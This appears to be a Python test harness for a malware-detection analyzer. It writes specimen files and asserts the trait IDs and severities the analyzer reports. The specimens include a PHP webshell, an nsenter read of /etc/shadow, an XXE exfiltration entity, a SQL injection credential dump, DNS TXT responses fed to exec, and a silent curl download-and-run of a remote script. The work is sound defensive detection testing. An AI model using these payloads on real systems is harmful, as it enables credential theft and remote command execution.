#!/usr/bin/env python3
"""Exercise data/operation boundaries without executing any specimen."""
import argparse
import json
import os
import re
from pathlib import Path
import subprocess
import tempfile
import zipfile

parser = argparse.ArgumentParser(description=__doc__)
parser.add_argument('--scratch', type=Path, required=True)
args = parser.parse_args()
root = Path(__file__).resolve().parents[3]
dns_eval = 'objectives/command-and-control/dns/tunneling::python-dns-cli-response-eval'
dns_process = 'objectives/command-and-control/dns/tunneling::python-dns-cli-response-process'
shadow = 'objectives/credential-access/files/password-database::nsenter-pid-one-shadow-read'
constant = 'metadata/lang/source/shape::python-markdown-string-module'
php = 'objectives/command-and-control/backdoor/webshell/embedded::embedded-php-request-command'
xxe = 'objectives/execution/exploit/xxe::system-url-embeds-entity-ref'
query = 'micro-behaviors/data/db/sql::union-credential-column-query-text'
sql_payload = 'objectives/execution/exploit/sql-injection::quoted-credential-union-payload'
detach = 'micro-behaviors/process/daemonize/detach::nohup-curl-download-output-suppressed'
deploy = 'micro-behaviors/process/deploy::nohup-curl-temp-script-cluster'
unverified = 'micro-behaviors/process/deploy::unverified-curl-temp-interpreter-cluster'
retired = {
    'objectives/command-and-control/dns/tunneling::python-dns-cli-command-exec',
    'objectives/lateral-movement/exploit/container::nsenter-host-shadow-read',
    'objectives/execution/exploit/sql-injection::union-credential-column-dump',
    'objectives/evasion/process/hidden/execution::nohup-hidden-curl-download',
    'objectives/evasion/process/hidden/execution::nohup-hidden-curl-staged-script-exec',
    'objectives/evasion/security-bypass/tls::unverified-curl-temp-interpreter-cluster',
}
dns_loop = 'objectives/command-and-control/dns/tunneling::python-dns-txt-returned-fields-shell-exec'
resolver = "import subprocess\nanswer = subprocess.check_output(['dig', '+short', 'TXT', 'example.invalid'])\n"
read_shadow = "nsenter --target 1 --mount --uts --ipc --net --pid -- sh -c 'cat /etc/shadow || hostname'"
webshell = '<?php system($_GET["cmd"]); ?>'
entity = 'SYSTEM "https://example.invalid/?data=%file;"'
load = 'nohup sh -c "curl --insecure --silent https://updates.acme.dev/job -o /var/tmp/job&&exec bash /var/tmp/job" </dev/null >/dev/null 2>&1 &'
def doc_module(value):
    return '"""Assessment reference."""\nEXAMPLES = """\n## Examples\n' + value + '\n"""\n'

# required maps ID -> criticality; absent is checked independently.
cases = {
    'dns-eval.py': (resolver + 'exec(answer)\n', {dns_eval: 4}, {dns_process}),
    'dns-decoded.py': (resolver + 'exec(answer.decode().strip())\n', {dns_eval: 4}, set()),
    'dns-process.py': (resolver + 'subprocess.run(answer, shell=True)\n', {dns_process: 4}, {dns_eval}),
    'dns-print.py': (resolver + 'print(answer)\n', {}, {dns_eval, dns_process}),
    'dns-unrelated.py': (resolver + 'subprocess.run(["printf", "hello"])\nexec("x = 1")\n', {}, {dns_eval, dns_process}),
    'zone-transfer.py': ('import subprocess\ncmd = ["dig", "example.invalid", "AXFR", "+short"]\nr = subprocess.run(cmd, capture_output=True, text=True)\nprint(r.stdout)\n', {}, {dns_eval, dns_process}),
    'shadow-call.py': ('import os\nos.system(' + repr(read_shadow) + ')\n', {shadow: 4}, set()),
    'shadow.sh': (read_shadow + '\n', {shadow: 4}, set()),
    'shadow-node.js': ('require(\"child_process\").execSync(' + json.dumps(read_shadow) + ');\n', {shadow: 4}, set()),
    'shadow-print.py': ('print(' + repr(read_shadow) + ')\n', {}, {shadow}),
    'shadow-validator.py': ('validator.run(' + repr(read_shadow) + ')\n', {}, {shadow}),
    'shadow-unrelated.py': ('import subprocess\nsubprocess.run("nsenter --target 1 --mount -- sh -c hostname", shell=True)\np = "/etc/shadow"\n', {}, {shadow}),
    'version.py': ('__version__ = \"1.2.3\"\n', {}, {constant}),
    'php-constant.py': (doc_module(webshell), {constant: 3, php: 3}, set()),
    'php-generator.py': ('def payload():\n    return ' + repr(webshell) + '\n', {php: 4}, {constant}),
    'php-attribute.py': (doc_module(webshell).replace('EXAMPLES =', 'obj.payload ='), {php: 4}, {constant}),
    'php-annotated.py': (doc_module(webshell).replace('EXAMPLES =', 'EXAMPLES: factory() ='), {php: 4}, {constant}),
    'php-interpolated.py': (doc_module(webshell + '{load_value()}').replace('EXAMPLES =', 'EXAMPLES = f'), {php: 4}, {constant}),
    'xxe-constant.py': (doc_module(entity), {constant: 3, xxe: 3}, set()),
    'xxe-generator.py': ('def payload():\n    return ' + repr(entity) + '\n', {xxe: 4}, {constant}),
    'sql-injection.py': ('def payload():\n    return ' + repr("' UNION SELECT username, password FROM users--") + '\n', {sql_payload: 4}, {constant}),
    'sql-triple-quoted.py': ('def query():\n    return ' + '\"' * 3 + 'UNION SELECT username, password FROM users' + '\"' * 3 + '\n', {query: 3}, {sql_payload}),
    'sql-constant.py': ('QUERY = "UNION SELECT username, password FROM users"\n', {query: 3}, {sql_payload}),
    'detached.rb': ('system(' + json.dumps(load) + ')\n', {detach: 3, deploy: 3, unverified: 4}, set()),
    'verified.rb': ('system(' + json.dumps(load.replace('--insecure ', '')) + ')\n', {detach: 3, deploy: 3}, {unverified}),
    'download.sh': ('curl -k https://updates.acme.dev/job -o /var/tmp/job\n', {}, {detach, deploy, unverified}),
}
# The flow producer leaves loop-item bindings opaque. Check the structural
# source/return/iteration/decoder/shell joins, including broken-join controls.
with zipfile.ZipFile(root / 'testdata/hostile/supply-chain-corpus/py/pypi-amberlite-dns-txt-cmdexec-linux.whl') as archive:
    loop_source = archive.read('amberlite/reach.py').decode()
renames = {'mirror_directives': 'query_items', 'apply_directives': 'apply_items',
           'out': 'response', 'fields': 'items', 'field': 'item', 'cmd': 'payload'}
loop_renamed = re.sub(r'\b(' + '|'.join(renames) + r')\b',
                      lambda match: renames[match.group()], loop_source)
cases.update({
    'dns-loop.py': (loop_source, {dns_loop: 5}, set()),
    'dns-loop-renamed.py': (loop_renamed, {dns_loop: 5}, set()),
    'dns-loop-other-return.py': (loop_source.replace('return fields', 'return ["local data"]'), {}, {dns_loop}),
    'dns-loop-other-decode.py': (loop_source.replace('base64.b32decode(field + "=" * (-len(field) % 8))', 'base64.b32decode(b"IFBEG===")'), {}, {dns_loop}),
    'dns-loop-print.py': (loop_source.replace('"/bin/sh", "-c"', '"printf", "%s"'), {}, {dns_loop}),
})
with tempfile.TemporaryDirectory(prefix='suijin-loader-controls-', dir=args.scratch) as folder:
    paths = []
    for name, (source, _, _) in cases.items():
        path = Path(folder) / name
        path.write_text(source)
        paths.append(path)
    cmd = [os.environ.get('CLEAVE', 'cleave'), '--traits-dir', str(root), '--json', 'analyze']
    proc = subprocess.run(cmd + list(map(str, paths)), cwd=root, capture_output=True, text=True)
    if not proc.stdout or 'validation failed' in proc.stderr:
        raise SystemExit(proc.stderr)
    reports = {}
    for line in proc.stdout.splitlines():
        for report in json.loads(line).get('files', []):
            reports[Path(report['path']).name] = report
    assert reports.keys() == cases.keys(), reports.keys()
    for name, (_, required, absent) in cases.items():
        traits = {t['id']: t['crit'] for t in reports[name].get('traits', [])}
        for ident, severity in required.items():
            assert traits.get(ident) == severity, (name, ident, severity, traits.get(ident))
        assert not (absent | retired) & traits.keys(), (name, (absent | retired) & traits.keys())
        if not name.startswith('dns-loop'):
            assert not any(v >= 5 for v in traits.values()), (name, traits)
        if name == 'detached.rb':
            assert sum(v >= 4 for v in traits.values()) == 1, traits
        print('PASS', name)
print(f'{len(cases)} boundary controls passed')
